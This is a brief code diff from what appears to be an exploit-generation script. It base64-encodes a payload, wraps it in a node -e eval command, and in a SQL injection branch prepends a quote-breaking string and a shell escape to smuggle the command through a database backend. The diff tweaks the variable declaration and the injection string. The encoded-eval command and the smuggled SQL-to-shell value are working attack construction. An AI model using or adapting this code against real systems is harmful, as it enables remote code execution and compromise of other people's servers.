@@ -23,11 +23,11 @@ const is_for_COMMAND_default = true;
 
 
 const encoded = Buffer.from(payload).toString('base64');
-const command = `node -e "eval(Buffer.from('${encoded}','base64').toString())"`;
+let command = `node -e "eval(Buffer.from('${encoded}','base64').toString())"`;
 
 if (is_for_BACKEND_sql_injection)
 {
-    command = `¿'; \\!` + `node -e "eval(Buffer.from('${encoded}','base64').toString())"` + `#`;
+    command = `¿'; \\! ` + `node -e "eval(Buffer.from('${encoded}','base64').toString())"` + `; #`;
 }
 else if (is_for_FRONTEND_gadgetchain)
 {
